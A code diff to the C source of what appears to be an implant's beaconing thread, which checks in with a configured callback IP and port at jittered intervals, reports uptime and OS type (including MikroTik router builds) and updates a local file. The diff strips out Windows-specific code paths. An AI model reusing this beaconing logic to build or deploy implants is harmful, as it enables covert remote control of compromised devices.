@@ -166,20 +166,14 @@ int beacon_start( char *beaconIP, int beaconPort, unsigned long initialDelay, in
 // TODO: UNIX pthreads calls function that returns a void pointer?  
 // is Windows flexible, if not, we can still be portable by defining a new 
 // return type and having that defined, specifically, at compile time
-#ifdef WIN32
-void beacon(void* param)
-#else
-void* beacon(void* param)
-#endif
+
+void *beacon(void* param)
 {
 	unsigned long secondsUp = 0;
 	int ret = 0;
 	int beaconInterval = 0;
 	int jitter = 0;
-#if defined WIN32
-	char* expandedfile;
-#endif
-	BEACONINFO* beaconInfo = (BEACONINFO*)param;
+	BEACONINFO *beaconInfo = (BEACONINFO *)param;
 
 #ifdef __VALGRIND__
 	int counter = 0;
@@ -245,15 +239,7 @@ void* beacon(void* param)
 		ret = send_beacon_data(beaconInfo,secondsUp,beaconInterval);
 		if(ret == SUCCESS)
 		{
-#if defined WIN32
-			expandedfile = (char*)malloc(MAX_PATH);
-			memset(expandedfile, 0, MAX_PATH);
-			ExpandEnvironmentStringsA(sdwtf, expandedfile, MAX_PATH);
-			update_file((char*)sdwtf);
-			free(expandedfile);
-#else
 			update_file((char*)sdfp);
-#endif
 		}
 #ifdef __VALGRIND__
 	if ( ++counter > 10 ) goto not_reached;
@@ -267,11 +253,7 @@ not_reached:
 	terminate_thread();
 #endif
 
-#ifdef WIN32
-	return;
-#else
 	return (void *)NULL;
-#endif
 }
 
 #include <stdlib.h>
@@ -338,9 +320,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	//MessageBox(NULL,"Let us Begin the Beacon!","OKAY",MB_OK);
 	//Populate Beacon Header
-#if defined WIN32
-	bhdr.os = htons(WINDOWS);
-#elif defined MIKROTIK
+#if defined MIKROTIK
 	#if defined _PPC
 	bhdr.os = htons(MIKROTIK_PPC);
 	#elif defined _MIPSBE
